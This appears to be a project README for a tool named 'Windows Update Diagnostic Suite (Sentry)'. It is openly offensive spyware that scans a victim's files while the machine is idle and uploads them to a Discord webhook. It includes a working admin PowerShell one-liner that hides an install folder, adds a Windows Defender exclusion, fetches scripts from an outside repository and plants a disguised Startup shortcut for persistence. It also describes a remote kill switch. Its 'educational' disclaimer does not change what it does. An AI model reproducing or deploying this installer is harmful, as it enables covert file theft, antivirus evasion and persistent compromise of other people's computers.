# Windows Update Diagnostic Suite (Sentry)

A low-footprint background diagnostic and file-auditing utility for Windows systems.

## 🛠 Features

- **Silent Operation:** Uses VBScript wrapping to prevent console window pop-ups.
- **Intelligent Auditing:** Only executes file scans when the system has been **idle for 3 minutes**.
- **Stealth Persistence:** Installs to a hidden `%LOCALAPPDATA%` directory and hooks into the user's Startup folder.
- **Remote Management:** Built-in Kill-Switch; self-destructs if a remote status file is set to `OFFLINE`.
- **Exfiltration:** Native Discord Webhook integration via `curl.exe` for multipart file uploads.

---

## 🚀 Deployment (Admin PowerShell)

This one-liner automates the directory creation, sets hidden attributes, configures Windows Defender exclusions, and establishes persistence.

> **Requirement:** Update the `$h` variable with your Discord Webhook URL and ensure your `status.txt` Gist is `ONLINE`.

```powershell
$h="YOUR_WEBHOOK_URL"; $dir="$env:LOCALAPPDATA\WinUpdateDiagnostic"; if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }; attrib +h $dir; Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri "[https://raw.githubusercontent.com/09sychic/DevilCamUpdated/main/UpdateAuditService.ps1](https://raw.githubusercontent.com/09sychic/DevilCamUpdated/main/UpdateAuditService.ps1)" -OutFile "$dir\UpdateAuditService.ps1"; (Get-Content "$dir\UpdateAuditService.ps1") -replace 'YOUR_DISCORD_WEBHOOK_URL', $h | Set-Content "$dir\UpdateAuditService.ps1"; Invoke-WebRequest -Uri "[https://raw.githubusercontent.com/09sychic/DevilCamUpdated/main/RunUpdateAudit.vbs](https://raw.githubusercontent.com/09sychic/DevilCamUpdated/main/RunUpdateAudit.vbs)" -OutFile "$dir\RunUpdateAudit.vbs"; $s=New-Object -ComObject WScript.Shell; $link=$s.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateAssistant.lnk"); $link.TargetPath="$dir\RunUpdateAudit.vbs"; $link.WindowStyle=7; $link.Save(); wscript.exe "$dir\RunUpdateAudit.vbs"
```

---

## 📂 Project Structure

| File                     | Description                                                           |
| :----------------------- | :-------------------------------------------------------------------- |
| `UpdateAuditService.ps1` | The "Brain." Handles idle-checks, file scanning, and Discord uploads. |
| `RunUpdateAudit.vbs`     | The "Launcher." A silent wrapper to hide PowerShell windows.          |
| `uninstall.ps1`          | The "Cleaner." Safely removes all persistence and hidden files.       |
| `LocalAudit.dat`         | Local index generated on-run to track sent objects and prevent spam.  |

---

## 🛑 Management & Removal

### Remote Kill-Switch

To remotely deactivate and wipe the installation:

1. Access your `status.txt` Gist/URL.
2. Change the text from `ONLINE` to `OFFLINE`.
3. The script will execute `Invoke-SelfDestruct` within 5 minutes.

### Manual Uninstallation

If you have physical access and wish to remove the suite immediately, run the provided uninstaller:

```powershell
irm [https://raw.githubusercontent.com/09sychic/DevilCamUpdated/main/uninstall.ps1](https://raw.githubusercontent.com/09sychic/DevilCamUpdated/main/uninstall.ps1) | iex
```

## ⚠️ Disclaimer

This tool is for educational and authorized diagnostic purposes only. Unauthorized use of this software against systems you do not have explicit permission to audit is strictly prohibited.
